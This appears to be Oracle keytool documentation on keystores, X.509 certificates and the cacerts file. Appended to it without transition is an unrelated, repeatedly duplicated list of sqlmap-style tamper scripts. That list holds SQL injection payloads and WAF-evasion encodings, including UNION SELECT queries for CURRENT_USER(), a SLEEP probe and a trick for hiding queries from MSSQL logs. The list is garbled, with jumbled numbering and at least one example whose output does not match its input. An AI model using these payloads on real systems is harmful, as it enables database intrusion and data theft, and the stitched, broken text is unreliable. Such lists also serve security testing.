+The KeyStore class provided in the java.security package supplies well-defined interfaces to access and modify the information in a keystore. It is possible for there to be multiple different concrete implementations, where each implementation is that for a particular type of keystore.
+
+Currently, two command-line tools (keytool and jarsigner) and a GUI-based tool named Policy Tool make use of keystore implementations. Because the KeyStore class is public, users can write additional security applications that use it.
+
+There is a built-in default implementation, provided by Oracle. It implements the keystore as a file with a proprietary keystore type (format) named JKS. It protects each private key with its individual password, and also protects the integrity of the entire keystore with a (possibly different) password.
+
+Keystore implementations are provider-based. More specifically, the application interfaces supplied by KeyStore are implemented in terms of a Service Provider Interface (SPI). That is, there is a corresponding abstract KeystoreSpi class, also in the java.security package, which defines the Service Provider Interface methods that providers must implement. The term provider refers to a package or a set of packages that supply a concrete implementation of a subset of services that can be accessed by the Java Security API. To provide a keystore implementation, clients must implement a provider and supply a KeystoreSpi subclass implementation, as described in How to Implement a Provider in the Java Cryptography Architecture at
+http://docs.oracle.com/javase/8/docs/technotes/guides/security/crypto/HowToImplAProvider.html.
+
+Applications can choose different types of keystore implementations from different providers, using the getInstance factory method supplied in the KeyStore class. A keystore type defines the storage and data format of the keystore information, and the algorithms used to protect private/secret keys in the keystore and the integrity of the keystore. Keystore implementations of different types are not compatible.
+
+The keytool command works on any file-based keystore implementation. It treats the keystore location that is passed to it at the command line as a file name and converts it to a FileInputStream, from which it loads the keystore information.)The jarsigner and policytool commands can read a keystore from any location that can be specified with a URL.
+
+For keytool and jarsigner, you can specify a keystore type at the command line, with the -storetype option. For Policy Tool, you can specify a keystore type with the Keystore menu.
+
+If you do not explicitly specify a keystore type, then the tools choose a keystore implementation based on the value of the keystore.type property specified in the security properties file. The security properties file is called java.security, and resides in the security properties directory, java.home\lib\security on Windows and java.home/lib/security on Oracle Solaris, where java.home is the runtime environment directory. The jre directory in the SDK or the top-level directory of the Java Runtime Environment (JRE).
+
+Each tool gets the keystore.type value and then examines all the currently installed providers until it finds one that implements a keystores of that type. It then uses the keystore implementation from that provider.The KeyStore class defines a static method named getDefaultType that lets applications and applets retrieve the value of the keystore.type property. The following line of code creates an instance of the default keystore type as specified in the keystore.type property:
+
+KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());
+The default keystore type is jks, which is the proprietary type of the keystore implementation provided by Oracle. This is specified by the following line in the security properties file:
+
+keystore.type=jks
+To have the tools utilize a keystore implementation other than the default, you can change that line to specify a different keystore type. For example, if you have a provider package that supplies a keystore implementation for a keystore type called pkcs12, then change the line to the following:
+
+keystore.type=pkcs12
+Note: Case does not matter in keystore type designations. For example, JKS would be considered the same as jks.
+
+Certificate
+A certificate (or public-key certificate) is a digitally signed statement from one entity (the issuer), saying that the public key and some other information of another entity (the subject) has some specific value. The following terms are related to certificates:
+
+Public Keys: These are numbers associated with a particular entity, and are intended to be known to everyone who needs to have trusted interactions with that entity. Public keys are used to verify signatures.
+
+Digitally Signed: If some data is digitally signed, then it is stored with the identity of an entity and a signature that proves that entity knows about the data. The data is rendered unforgeable by signing with the entity's private key.
+
+Identity: A known way of addressing an entity. In some systems, the identity is the public key, and in others it can be anything from an Oracle Solaris UID to an email address to an X.509 distinguished name.
+
+Signature: A signature is computed over some data using the private key of an entity. The signer, which in the case of a certificate is also known as the issuer.
+
+Private Keys: These are numbers, each of which is supposed to be known only to the particular entity whose private key it is (that is, it is supposed to be kept secret). Private and public keys exist in pairs in all public key cryptography systems (also referred to as public key crypto systems). In a typical public key crypto system, such as DSA, a private key corresponds to exactly one public key. Private keys are used to compute signatures.
+
+Entity: An entity is a person, organization, program, computer, business, bank, or something else you are trusting to some degree.
+
+Public key cryptography requires access to users' public keys. In a large-scale networked environment, it is impossible to guarantee that prior relationships between communicating entities were established or that a trusted repository exists with all used public keys. Certificates were invented as a solution to this public key distribution problem. Now a Certification Authority (CA) can act as a trusted third party. CAs are entities such as businesses that are trusted to sign (issue) certificates for other entities. It is assumed that CAs only create valid and reliable certificates because they are bound by legal agreements. There are many public Certification Authorities, such as VeriSign, Thawte, Entrust, and so on.
+
+You can also run your own Certification Authority using products such as Microsoft Certificate Server or the Entrust CA product for your organization. With the keytool command, it is possible to display, import, and export certificates. It is also possible to generate self-signed certificates.
+
+The keytool command currently handles X.509 certificates.
+
+X.509 Certificates
+The X.509 standard defines what information can go into a certificate and describes how to write it down (the data format). All the data in a certificate is encoded with two related standards called ASN.1/DER. Abstract Syntax Notation 1 describes data. The Definite Encoding Rules describe a single way to store and transfer that data.
+
+All X.509 certificates have the following data, in addition to the signature:
+
+Version: This identifies which version of the X.509 standard applies to this certificate, which affects what information can be specified in it. Thus far, three versions are defined. The keytool command can import and export v1, v2, and v3 certificates. It generates v3 certificates.
+
+X.509 Version 1 has been available since 1988, is widely deployed, and is the most generic.
+
+X.509 Version 2 introduced the concept of subject and issuer unique identifiers to handle the possibility of reuse of subject or issuer names over time. Most certificate profile documents strongly recommend that names not be reused and that certificates should not make use of unique identifiers. Version 2 certificates are not widely used.
+
+X.509 Version 3 is the most recent (1996) and supports the notion of extensions where anyone can define an extension and include it in the certificate. Some common extensions are: KeyUsage (limits the use of the keys to particular purposes such as signing-only) and AlternativeNames (allows other identities to also be associated with this public key, for example. DNS names, email addresses, IP addresses). Extensions can be marked critical to indicate that the extension should be checked and enforced or used. For example, if a certificate has the KeyUsage extension marked critical and set to keyCertSign, then when this certificate is presented during SSL communication, it should be rejected because the certificate extension indicates that the associated private key should only be used for signing certificates and not for SSL use.
+
+Serial number: The entity that created the certificate is responsible for assigning it a serial number to distinguish it from other certificates it issues. This information is used in numerous ways. For example, when a certificate is revoked its serial number is placed in a Certificate Revocation List (CRL).
+
+Signature algorithm identifier: This identifies the algorithm used by the CA to sign the certificate.
+
+Issuer name: The X.500 Distinguished Name of the entity that signed the certificate. See X.500 Distinguished Names. This is typically a CA. Using this certificate implies trusting the entity that signed this certificate. In some cases, such as root or top-level CA certificates, the issuer signs its own certificate.
+
+Validity period: Each certificate is valid only for a limited amount of time. This period is described by a start date and time and an end date and time, and can be as short as a few seconds or almost as long as a century. The validity period chosen depends on a number of factors, such as the strength of the private key used to sign the certificate, or the amount one is willing to pay for a certificate. This is the expected period that entities can rely on the public value, when the associated private key has not been compromised.
+
+Subject name: The name of the entity whose public key the certificate identifies. This name uses the X.500 standard, so it is intended to be unique across the Internet. This is the X.500 Distinguished Name (DN) of the entity. See X.500 Distinguished Names. For example,
+
+CN=Java Duke, OU=Java Software Division, O=Oracle Corporation, C=US
+These refer to the subject's common name (CN), organizational unit (OU), organization (O), and country (C).
+
+Subject public key information: This is the public key of the entity being named with an algorithm identifier that specifies which public key crypto system this key belongs to and any associated key parameters.
+
+Certificate Chains
+The keytool command can create and manage keystore key entries that each contain a private key and an associated certificate chain. The first certificate in the chain contains the public key that corresponds to the private key.
+
+When keys are first generated, the chain starts off containing a single element, a self-signed certificate. See -genkeypair in Commands. A self-signed certificate is one for which the issuer (signer) is the same as the subject. The subject is the entity whose public key is being authenticated by the certificate. Whenever the -genkeypair command is called to generate a new public/private key pair, it also wraps the public key into a self-signed certificate.
+
+Later, after a Certificate Signing Request (CSR) was generated with the -certreq command and sent to a Certification Authority (CA), the response from the CA is imported with -importcert, and the self-signed certificate is replaced by a chain of certificates. See the -certreq and -importcert options in Commands. At the bottom of the chain is the certificate (reply) issued by the CA authenticating the subject's public key. The next certificate in the chain is one that authenticates the CA's public key.
+
+In many cases, this is a self-signed certificate, which is a certificate from the CA authenticating its own public key, and the last certificate in the chain. In other cases, the CA might return a chain of certificates. In this case, the bottom certificate in the chain is the same (a certificate signed by the CA, authenticating the public key of the key entry), but the second certificate in the chain is a certificate signed by a different CA that authenticates the public key of the CA you sent the CSR to. The next certificate in the chain is a certificate that authenticates the second CA's key, and so on, until a self-signed root certificate is reached. Each certificate in the chain (after the first) authenticates the public key of the signer of the previous certificate in the chain.
+
+Many CAs only return the issued certificate, with no supporting chain, especially when there is a flat hierarchy (no intermediates CAs). In this case, the certificate chain must be established from trusted certificate information already stored in the keystore.
+
+A different reply format (defined by the PKCS #7 standard) includes the supporting certificate chain in addition to the issued certificate. Both reply formats can be handled by the keytool command.
+
+The top-level (root) CA certificate is self-signed. However, the trust into the root's public key does not come from the root certificate itself, but from other sources such as a newspaper. This is because anybody could generate a self-signed certificate with the distinguished name of, for example, the VeriSign root CA. The root CA public key is widely known. The only reason it is stored in a certificate is because this is the format understood by most tools, so the certificate in this case is only used as a vehicle to transport the root CA's public key. Before you add the root CA certificate to your keystore, you should view it with the -printcert option and compare the displayed fingerprint with the well-known fingerprint obtained from a newspaper, the root CA's Web page, and so on.
+
+The cacerts Certificates File
+A certificates file named cacerts resides in the security properties directory, java.home\lib\security on Windows and java.home/lib/security on Oracle Solaris, where java.home is the runtime environment's directory, which would be the jre directory in the SDK or the top-level directory of the JRE.
+
+The cacerts file represents a system-wide keystore with CA certificates. System administrators can configure and manage that file with the keytool command by specifying jks as the keystore type. The cacerts keystore file ships with a default set of root CA certificates. You can list the default certificates with the following command:
+
+keytool -list -keystore java.home/lib/security/cacerts
+The initial password of the cacerts keystore file is changeit. System administrators should change that password and the default access permission of that file upon installing the SDK.
+
+Note: It is important to verify your cacerts file. Because you trust the CAs in the cacerts file as entities for signing and issuing certificates to other entities, you must manage the cacerts file carefully. The cacerts file should contain only certificates of the CAs you trust. It is your responsibility to verify the trusted root CA certificates bundled in the cacerts file and make your own trust decisions.
+
+To remove an untrusted CA certificate from the cacerts file, use the delete option of the keytool command. You can find the cacerts file in the JRE installation directory. Contact your system administrator if you do not have permission to edit this file
+
+Internet RFC 1421 Certificate Encoding Standard
+Certificates are often stored using the printable encoding format defined by the Internet RFC 1421 standard, instead of their binary encoding. This certificate format, also known as Base64 encoding, makes it easy to export certificates to other applications by email or through some other mechanism.
+
+Certificates read by the -importcert and -printcert commands can be in either this format or binary encoded. The -exportcert command by default outputs a certificate in binary encoding, but will instead output a certificate in the printable encoding format, when the -rfc option is specified.
+
+The -list command by default prints the SHA256 fingerprint of a certificate. If the -v option is specified, then the certificate is printed in human-readable format. If the -rfc option is specified, then the certificate is output in the printable encoding format.
+
+In its printable encoding format, the encoded certificate is bounded at the beginning and end by the following text:
+
+-----BEGIN CERTIFICATE-----
+
+encoded certificate goes here. 
+
+-----END CERTIFICATE-----
+X.500 Distinguished Names
+X.500 Distinguished Names are used to identify entities, such as those that are named by the subject and issuer (signer) fields of X.509 certificates. The keytool command supports the following subparts:
+
+commonName: The common name of a person such as Susan Jones.
+
+organizationUnit: The small organization (such as department or division) name. For example, Purchasing.
+
+localityName: The locality (city) name, for example, Palo Alto.
+
+stateName: State or province name, for example, California.
+
+country: Two-letter country code, for example, CH.
+
+When you supply a distinguished name string as the value of a -dname option, such as for the -genkeypair command, the string must be in the following format:
+
+CN=cName, OU=orgUnit, O=org, L=city, S=state, C=countryCode
+All the italicized items represent actual values and the previous keywords are abbreviations for the following:
+
+CN=commonName
+OU=organizationUnit
+O=organizationName
+L=localityName
+S=stateName
+C=country
+A sample distinguished name string is:
+
+CN=Mark Smith, OU=Java, O=Oracle, L=Cupertino, S=California, C=US
+A sample command using such a string is:
+
+keytool -genkeypair -dname "CN=Mark Smith, OU=Java, O=Oracle, L=Cupertino,
+S=California, C=US" -alias mark
+Case does not matter for the keyword abbreviations. For example, CN, cn, and Cn are all treated the same.
+
+Order matters; each subcomponent must appear in the designated order. However, it is not necessary to have all the subcomponents. You can use a subset, for example:
+
+CN=Steve Meier, OU=Java, O=Oracle, C=US
+If a distinguished name string value contains a comma, then the comma must be escaped by a backslash (\) character when you specify the string on a command line, as in:
+
+cn=Peter Schuster, ou=Java\, Product Development, o=Oracle, c=US
+It is never necessary to specify a distinguished name string on a command line. When the distinguished name is needed for a command, but not supplied on the command line, the user is prompted for each of the subcomponents. In this case, a comma does not need to be escaped by a backslash (\).
+
+Warnings
+Importing Trusted Certificates Warning
+Important: Be sure to check a certificate very carefully before importing it as a trusted certificate.
+
+Windows Example:
+
+View the certificate first with the -printcert command or the -importcert command without the -noprompt option. Ensure that the displayed certificate fingerprints match the expected ones. For example, suppose sends or emails you a certificate that you put it in a file named \tmp\cert. Before you consider adding the certificate to your list of trusted certificates, you can execute a -printcert command to view its fingerprints, as follows:
+
+  keytool -printcert -file \tmp\cert
+    Owner: CN=ll, OU=ll, O=ll, L=ll, S=ll, C=ll
+    Issuer: CN=ll, OU=ll, O=ll, L=ll, S=ll, C=ll
+    Serial Number: 59092b34
+    Valid from: Thu Sep 25 18:01:13 PDT 1997 until: Wed Dec 24 17:01:13 PST 1997
+    Certificate Fingerprints:
+         SHA1: 20:B6:17:FA:EF:E5:55:8A:D0:71:1F:E8:D6:9D:C0:37:13:0E:5E:FE
+         SHA256: 90:7B:70:0A:EA:DC:16:79:92:99:41:FF:8A:FE:EB:90:
+                 17:75:E0:90:B2:24:4D:3A:2A:16:A6:E4:11:0F:67:A4
+Oracle Solaris Example:
+
+View the certificate first with the -printcert command or the -importcert command without the -noprompt option. Ensure that the displayed certificate fingerprints match the expected ones. For example, suppose someone sends or emails you a certificate that you put it in a file named /tmp/cert. Before you consider adding the certificate to your list of trusted certificates, you can execute a -printcert command to view its fingerprints, as follows:
+
+  keytool -printcert -file /tmp/cert
+    Owner: CN=ll, OU=ll, O=ll, L=ll, S=ll, C=ll
+    Issuer: CN=ll, OU=ll, O=ll, L=ll, S=ll, C=ll
+    Serial Number: 59092b34
+    Valid from: Thu Sep 25 18:01:13 PDT 1997 until: Wed Dec 24 17:01:13 PST 1997
+    Certificate Fingerprints:
+         SHA1: 20:B6:17:FA:EF:E5:55:8A:D0:71:1F:E8:D6:9D:C0:37:13:0E:5E:FE
+         SHA256: 90:7B:70:0A:EA:DC:16:79:92:99:41:FF:8A:FE:EB:90:
+                 17:75:E0:90:B2:24:4D:3A:2A:16:A6:E4:11:0F:67:A4
+Then call or otherwise contact the person who sent the certificate and compare the fingerprints that you see with the ones that they show. Only when the fingerprints are equal is it guaranteed that the certificate was not replaced in transit with somebody else's certificate such as an attacker's certificate. If such an attack took place, and you did not check the certificate before you imported it, then you would be trusting anything the attacker signed, for example, a JAR file with malicious class files inside.
+
+Note: It is not required that you execute a -printcert command before importing a certificate. This is because before you add a certificate to the list of trusted certificates in the keystore, the -importcert command prints out the certificate information and prompts you to verify it. You can then stop the import operation. However, you can do this only when you call the -importcert command without the -noprompt option. If the -noprompt option is specified, then there is no interaction with the user.
+
+Passwords Warning
+Most commands that operate on a keystore require the store password. Some commands require a private/secret key password. Passwords can be specified on the command line in the -storepass and -keypass options. However, a password should not be specified on a command line or in a script unless it is for testing, or you are on a secure system. When you do not specify a required password option on a command line, you are prompted for it.
+
+Certificate Conformance Warning
+The Internet standard RFC 5280 has defined a profile on conforming X.509 certificates, which includes what values and value combinations are valid for certificate fields and extensions. See the standard at
+http://tools.ietf.org/rfc/rfc5280.txt
+
+The keytool command does not enforce all of these rules so it can generate certificates that do not conform to the standard. Certificates that do not conform to the standard might be rejected by JRE or other applications. Users should ensure that they provide the correct options for -dname, -ext, and so on.
+
+Notes
+Import a New Trusted Certificate
+Before you add the certificate to the keystore, the keytool command verifies it by attempting to construct a chain of trust from that certificate to a self-signed certificate (belonging to a root CA), using trusted certificates that are already available in the keystore.
+
+If the -trustcacerts option was specified, then additional certificates are considered for the chain of trust, namely the certificates in a file named cacerts.
+
+If the keytool command fails to establish a trust path from the certificate to be imported up to a self-signed certificate (either from the keystore or the cacerts file), then the certificate information is printed, and the user is prompted to verify it by comparing the displayed certificate fingerprints with the fingerprints obtained from some other (trusted) source of information, which might be the certificate owner. Be very careful to ensure the certificate is valid before importing it as a trusted certificate. See Importing Trusted Certificates Warning. The user then has the option of stopping the import operation. If the -noprompt option is specified, then there is no interaction with the user.
+
+Import a Certificate Reply
+When you import a certificate reply, the certificate reply is validated with trusted certificates from the keystore, and optionally, the certificates configured in the cacerts keystore file when the -trustcacerts option is specified. See The cacerts Certificates File.
+
+The methods of determining whether the certificate reply is trusted are as follows:
+
+If the reply is a single X.509 certificate, then the keytool command attempts to establish a trust chain, starting at the certificate reply and ending at a self-signed certificate (belonging to a root CA). The certificate reply and the hierarchy of certificates is used to authenticate the certificate reply from the new certificate chain of aliases. If a trust chain cannot be established, then the certificate reply is not imported. In this case, the keytool command does not print the certificate and prompt the user to verify it, because it is very difficult for a user to determine the authenticity of the certificate reply.
+
+If the reply is a PKCS #7 formatted certificate chain or a sequence of X.509 certificates, then the chain is ordered with the user certificate first followed by zero or more CA certificates. If the chain ends with a self-signed root CA certificate and the -trustcacerts option was specified, the keytool command attempts to match it with any of the trusted certificates in the keystore or the cacerts keystore file. If the chain does not end with a self-signed root CA certificate and the -trustcacerts option was specified, the keytool command tries to find one from the trusted certificates in the keystore or the cacerts keystore file and add it to the end of the chain. If the certificate is not found and the -noprompt option is not specified, the information of the last certificate in the chain is printed, and the user is prompted to verify it.
+
+If the public key in the certificate reply matches the user's public key already stored with alias, then the old certificate chain is replaced with the new certificate chain in the reply. The old chain can only be replaced with a valid keypass, and so the password used to protect the private key of the entry is supplied. If no password is provided, and the private key password is different from the keystore password, the user is prompted for it.
+
+This command was named -import in earlier releases. This old name is still supported in this release. The new name, -importcert, is preferred going forward.
+
+See Also
+jar(1)
+
+jarsigner(1)
+
+Trail: Security Features in Java SE at
+http://docs.oracle.com/javase/tutorial/security/index.html
+
+Contents    Previous    Next
+Copyright © 1993, 2021, Oracle and/or its affiliates. All rights reserved.Contact Us
+(1) apostrophemask.py UTF-8 encoding Example: 
+* Input: AND '1'='1' 
+* Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87 
+
+(2) apostrophenullencode.py unicode encoding Example: 
+* Input: AND '1'='1' 
+* Output: AND %00%271%00%27=%00%271%00%27 
+
+(3) appendnullbyte.py adds %00 Example: 
+* Input: AND 1=1 
+* Output: AND 1=1%00 
+Requirement: 
+* Microsoft Access 
+
+(4) base64encode.py base64 encoding Example: 
+* Input: 1' AND SLEEP(5)# 
+* Output: MScgQU5EIFNMRUVQKDUpIw== 
+
+(5) between.py Replace "not between" with ">" Example: 
+* Input: 'A > B' 
+* Output: 'A NOT BETWEEN 0 AND B' 
+
+(6) bluecoat.py replaces spaces with random blank characters, and replaces "like" with "=" Example: 
+* Input: SELECT id FROM users where id = 1 
+* Output: SELECT%09id FROM users where id LIKE 1 
+Requirement: 
+* MySQL 5.1, SGOS 
+
+(7) chardoubleencode.py Double URL encoding Example: 
+* Input: SELECT FIELD FROM%20TABLE 
+* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
+
+(8) charencode.py url encoding Example: 
+* Input: SELECT FIELD FROM%20TABLE 
+* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
+
+(9) charunicodeencode.py performs unicode encoding on characters that are not url-encoded Example: 
+* Input: SELECT FIELD%20FROM TABLE 
+* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'
+Requirement: 
+* ASP 
+* ASP.NET 
+
+(10) equaltolike.py replace "like" with "=" Example: 
+* Input: SELECT * FROM users WHERE id=1 
+* Output:
+1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
+Requirement: 
+* MySQL 
+(11) halfversionedmorekeywords.py adds conditional comments before each keyword Example: 
+* Input: value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa 
+* Output: value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)), NULL, NULL#/*!0AND 'QDWa'='QDWa 
+Requirement: 
+* MySQL < 5.1 
+
+(12) ifnull2ifisnull.py Replace "IFNULL(A, B)" with "IF(ISNULL(A), B, A)" Example: 
+* Input: IFNULL(1, 2) 
+* Output: IF(ISNULL(1), 2, 1) 
+Requirement: 
+* MySQL 
+* SQLite (possibly) 
+* SAP MaxDB (possibly) 
+
+(13) modsecurityversioned.py condition comment Example: 
+* Input: 1 AND 2>1-- 
+* Output: 1/*!30000AND 2>1*/-- 
+Requirement: 
+* MySQL 
+
+(14) Modsecurityzeroversioned.py condition comment, 0000 Example: 
+* Input: 1 AND 2>1-- 
+* Output: 1/*!00000AND 2>1*/-- 
+Requirement: 
+* MySQL 
+
+(15) multiplespaces.py Add multiple spaces Example: 
+* Input: UNION SELECT 
+* Output:  UNION  SELECT 
+
+(16) nonrecursivereplacement.py can bypass the anti-injection of keyword deletion (I don't know how to say this, look at the example...) Example: 
+* Input: 1 UNION SELECT 2-- 
+* Output: 1 UNUNIONION SELSELECTECT 2-- 
+
+(17) percentage.py Add a percent sign (%) before each character Example: 
+* Input: SELECT FIELD FROM TABLE 
+* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 
+Requirement: 
+* ASP 
+
+(18) randomcase.py random case. Example: 
+* Input: INSERT 
+* Output: InsERt 
+
+(19) randomcomments.py randomly insert block comments Example: 
+'INSERT' becomes 'IN/**/S/**/ERT' 
+securesphere.py Add a "true" string to the end of the statement 
+Example: 
+* Input: AND 1=1 
+* Output: AND 1=1 and '0having'='0having' 
+
+(20) Add "sp_password" at the end of sp_password.py to confuse database logs (very...) Example: www.2cto.com 
+* Input: 1 AND 9227=9227-- 
+* Output: 1 AND 9227=9227--sp_password 
+Requirement: 
+* MSSQL
+
+(24) space2morehash.py does not see any difference from the above one. . Requirement: 
+* MySQL >= 5.1.13 
+
+(25) space2mssqlblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT%08id%02FROM%0Fusers 
+Requirement: 
+* Microsoft SQL Server 
+
+(26) space2mssqlhash.py Replace spaces with single-line comments "#" and new lines Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1%23%0A9227=9227 
+Requirement: 
+* MSSQL 
+* MySQL 
+
+(27) space2mysqlblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT%0Bid%0BFROM%A0users 
+Requirement: 
+* MySQL 
+
+(28) space2mysqldash.py Replace spaces with single-line comments and new lines Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1--%0AAND--%0A9227=9227 
+Requirement: 
+* MySQL 
+* MSSQL 
+
+(29) space2plus.py Replace spaces with "+" Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT+id+FROM+users (20) Add "sp_password" at the end of sp_password.py to confuse database logs (very...) Example: www.2cto.com 
+* Input: 1 AND 9227=9227-- 
+* Output: 1 AND 9227=9227--sp_password 
+Requirement: 
+* MSSQL 
+
+(21) space2comment.py Replace spaces with block comments Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT/**/id/**/FROM/**/users 
+
+(22) space2dash.py replace spaces with single-line comments "--" and random new lines Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1--PTTmJopxdWJ%0AAND--cWfcVRPV%0A9227=9227 
+Requirement: 
+* MSSQL 
+* SQLite 
+
+(23) space2hash.py replace spaces with a single-line comment "#" and a new line consisting of random characters Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
+Requirement: 
+* MySQL 
+
+(24) space2morehash.py does not see any difference from the above one. . Requirement: 
+* MySQL >= 5.1.13 
+
+(25) space2mssqlblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT%08id%02FROM%0Fusers 
+Requirement: 
+* Microsoft SQL Server 
+
+(26) space2mssqlhash.py Replace spaces with single-line comments "#" and new lines Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1%23%0A9227=9227 
+Requirement: 
+* MSSQL 
+* MySQL(27) space2mysqlblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT%0Bid%0BFROM%A0users 
+Requirement: 
+* MySQL 
+
+(28) space2mysqldash.py Replace spaces with single-line comments and new lines Example: 
+* Input: 1 AND 9227=9227 
+* Output: 1--%0AAND--%0A9227=9227 
+Requirement: 
+* MySQL 
+* MSSQL 
+
+(29) space2plus.py Replace spaces with "+" Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT+id+FROM+users 
+
+(30) space2randomblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT\rid\tFROM\nusers 
+
+(31) unionalltounion.py replace "union" with "union all" Example: 
+* Input: -1 UNION ALL SELECT 
+* Output: -1 UNION SELECT 
+
+(32) unmagicquotes.py replace the single quotes with "%bf%27" and add a comment at the end "--" Example: 
+* Input: 1' AND 1=1 
+* Output: 1%bf%27 AND 1=1--%20 
+
+(33)versionedkeywords.py Example: 
+* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# 
+* Output:  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
+Requirement: 
+* MySQL 
+
+(34) versionedmorekeywords.py comment on keyword conditions 
+Example: 
+* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
+* Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
+Requirement: 
+* MySQL >= 5.1.13
+
+(30) space2randomblank.py Replace spaces with random blank characters Example: 
+* Input: SELECT id FROM users 
+* Output: SELECT\rid\tFROM\nusers 
+
+(31) unionalltounion.py replace "union" with "union all" Example: 
+* Input: -1 UNION ALL SELECT 
+* Output: -1 UNION SELECT 
+
+(32) unmagicquotes.py replace the single quotes with "%bf%27" and add a comment at the end "--" Example: 
+* Input: 1' AND 1=1 
+* Output: 1%bf%27 AND 1=1--%20 
+
+(33)versionedkeywords.py Example: 
+* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# 
+* Output:  1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#
+Requirement: 
+* MySQL 
+
+(34) versionedmorekeywords.py comment on keyword conditions 
+Example: 
+* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# 
+* Output: 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#
+Requirement
+*#SQL
+(1) apostrophemask.py UTF-8 encoding Example: 
+* Input: AND '1'='1' 
+* Output: AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87 
+
+(2) apostrophenullencode.py unicode encoding Example: 
+* Input: AND '1'='1' 
+* Output: AND %00%271%00%27=%00%271%00%27 
+
+(3) appendnullbyte.py adds %00 Example: 
+* Input: AND 1=1 
+* Output: AND 1=1%00 
+Requirement: 
+* Microsoft Access 
+
+(4) base64encode.py base64 encoding Example: 
+* Input: 1' AND SLEEP(5)# 
+* Output: MScgQU5EIFNMRUVQKDUpIw== 
+
+(5) between.py Replace "not between" with ">" Example: 
+* Input: 'A > B' 
+* Output: 'A NOT BETWEEN 0 AND B' 
+
+(6) bluecoat.py replaces spaces with random blank characters, and replaces "like" with "=" Example: 
+* Input: SELECT id FROM users where id = 1 
+* Output: SELECT%09id FROM users where id LIKE 1 
+Requirement: 
+* MySQL 5.1, SGOS 
+
+(7) chardoubleencode.py Double URL encoding Example: 
+* Input: SELECT FIELD FROM%20TABLE 
+* Output: %2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%254f%254d%2520%2554%2541%2542%254c%2545
+
+(8) charencode.py url encoding Example: 
+* Input: SELECT FIELD FROM%20TABLE 
+* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45
+
+(9) charunicodeencode.py performs unicode encoding on characters that are not url-encoded Example: 
+* Input: SELECT FIELD%20FROM TABLE 
+* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045'
+Requirement: 
+* ASP 
+* ASP.NET 
+
+(10) equaltolike.py replace "like" with "=" Example: 
+* Input: SELECT * FROM users WHERE id=1 
+* Output:
+1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227 
+Requirement: 
+* MySQL 
+
